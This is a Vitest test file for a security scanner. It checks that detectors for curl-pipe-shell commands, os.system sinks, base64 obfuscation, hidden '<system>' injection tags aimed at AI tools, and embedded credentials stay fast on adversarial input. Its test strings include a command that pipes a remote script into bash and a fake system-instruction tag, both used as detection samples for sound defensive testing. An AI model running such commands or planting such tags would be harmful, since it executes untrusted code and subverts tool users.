import { describe, it, expect } from 'vitest';
import { analyzePythonDataFlow } from './python-sinks.js';
import { looksBase64Encoded } from './obfuscation.js';
import { scanWithPatterns } from './pattern-engine.js';

/** Inputs that made a regex backtrack exponentially (dt13 self-security). */
const timed = (fn: () => unknown): number => {
  const start = Date.now();
  fn();
  return Date.now() - start;
};

describe('analyzer regexes stay linear on hostile input', () => {
  it('python string stripping with a run of escapes and no closing quote', () => {
    const line = `x = "${'\\a'.repeat(40)}\\`;
    expect(timed(() => analyzePythonDataFlow(`import os\n${line}\nos.system(cmd)\n`))).toBeLessThan(1000);
    // still strips real strings: brackets inside them don't open a call
    expect(analyzePythonDataFlow('import os\nos.system("(" )\n').some(f => f.type === 'eval-exec')).toBe(true);
  });

  it('camelCase test on a long lowercase literal with a trailing capital', () => {
    expect(timed(() => looksBase64Encoded(`${'a'.repeat(60)}B`))).toBeLessThan(1000);
    expect(looksBase64Encoded('UntitledSingleSelectEnumSchema')).toBe(false); // identifier, not base64
    expect(looksBase64Encoded('authorization2EndpointUrl')).toBe(false);
  });

  it('curl-pipe-shell with many NAME=value lookalikes', () => {
    const line = `curl x |env /${'==\t-'.repeat(40)}a`;
    expect(timed(() => scanWithPatterns(line))).toBeLessThan(1000);
    expect(scanWithPatterns('curl -fsSL https://x.test/i.sh | env FOO=1 BAR=2 bash').some(m => m.description === 'Curl-pipe-shell execution')).toBe(true);
  });
});

describe('dt13 perf: linear on adversarial input', () => {
  it('hidden-instruction tag regex with many unclosed quoted attributes', async () => {
    const { DIRECTIVE_PATTERNS } = await import('../mcp/injection-directives.js');
    const tag = DIRECTIVE_PATTERNS.find(d => d.re.source.includes('important|system'))!.re;
    expect(timed(() => tag.test(`<system ${'a="x" '.repeat(40)}`))).toBeLessThan(500);
    expect(tag.test('<system priority="high">')).toBe(true);
    expect(tag.test('<system tmp>/cache')).toBe(false);
  });

  it('credential masking on a long scheme-like token', async () => {
    const { maskCredentialsInText } = await import('../reporting/serialize.js');
    expect(timed(() => maskCredentialsInText(`${'a-'.repeat(100_000)}:`))).toBeLessThan(1000);
    expect(maskCredentialsInText('see https://user:hunter22@example.com/x')).not.toContain('hunter22');
  });
});
